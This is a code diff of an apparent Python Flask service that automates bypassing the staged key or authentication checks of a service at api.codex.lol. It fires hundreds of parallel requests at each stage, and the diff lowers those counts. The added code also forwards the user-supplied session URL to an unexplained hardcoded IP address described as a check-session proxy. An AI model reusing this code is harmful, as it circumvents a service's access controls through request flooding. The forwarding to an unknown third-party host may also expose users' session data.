@@ -32,31 +32,24 @@ def decode_token_data(token):
     data = base64decode(data)
     return json.loads(data)
 
-def get_stages(session):
-    def single_request():
+def get_stages(session_url):
+    try:
+        # Gọi đến proxy check-session, dùng chính URL người dùng truyền vào
+        check_api_url = f"http://87.106.100.210:6410/api/check-session?url={session_url}"
         headers = {
-            'Android-Session': session,
             'User-Agent': random.choice(user_agents)
         }
-        try:
-            response = requests.get('https://api.codex.lol/v1/stage/stages', headers=headers, timeout=10)
-            data = response.json()
-            if data.get('error') == 'invalid-session':
-                return {'error': 'invalid-session', 'message': data.get('userFacingMessage')}
-            if data.get('success', False) and not data.get('authenticated', False):
-                return data.get('stages', [])
-        except:
-            return None
+        response = requests.get(check_api_url, headers=headers, timeout=10)
+        data = response.json()
+
+        if data.get('error') == 'invalid-session':
+            return {'error': 'invalid-session', 'message': data.get('userFacingMessage')}
+
+        if data.get('success', False) and not data.get('authenticated', False):
+            return data.get('stages', [])
+    except:
         return None
-
-    with ThreadPoolExecutor(max_workers=600) as executor:
-        futures = [executor.submit(single_request) for _ in range(600)]
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                return result
-
-    return []
+    return None
 
 def initiate_stage(stage_id, session):
     def single_request():
@@ -75,8 +68,8 @@ def initiate_stage(stage_id, session):
             return None
         return None
 
-    with ThreadPoolExecutor(max_workers=300) as executor:
-        futures = [executor.submit(single_request) for _ in range(300)]
+    with ThreadPoolExecutor(max_workers=150) as executor:
+        futures = [executor.submit(single_request) for _ in range(150)]
         for future in as_completed(futures):
             result = future.result()
             if result:
@@ -102,8 +95,8 @@ def validate_stage(token, referrer, session):
             return None
         return None
 
-    with ThreadPoolExecutor(max_workers=300) as executor:
-        futures = [executor.submit(single_request) for _ in range(300)]
+    with ThreadPoolExecutor(max_workers=150) as executor:
+        futures = [executor.submit(single_request) for _ in range(150)]
         for future in as_completed(futures):
             result = future.result()
             if result:
@@ -131,8 +124,8 @@ def authenticate(validated_tokens, session):
             return None
         return None
 
-    with ThreadPoolExecutor(max_workers=500) as executor:
-        futures = [executor.submit(single_request) for _ in range(500)]
+    with ThreadPoolExecutor(max_workers=200) as executor:
+        futures = [executor.submit(single_request) for _ in range(200)]
         for future in as_completed(futures):
             if future.result():
                 return True
@@ -152,7 +145,7 @@ def start_process():
         return jsonify({"error": "Invalid URL or token not found."}), 400
 
     start_time = time.time()
-    stages = get_stages(session)
+    stages = get_stages(session_url)
     if isinstance(stages, dict):
         if stages.get('error') == 'invalid-session':
             return jsonify({"status": "success", "result": stages.get('message', "Your session is invalid.")}), 200
@@ -193,4 +186,4 @@ def start_process():
         return jsonify({"error": "Authentication failed during final step."}), 400
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=69)
+    app.run(host='0.0.0.0', port=5000)
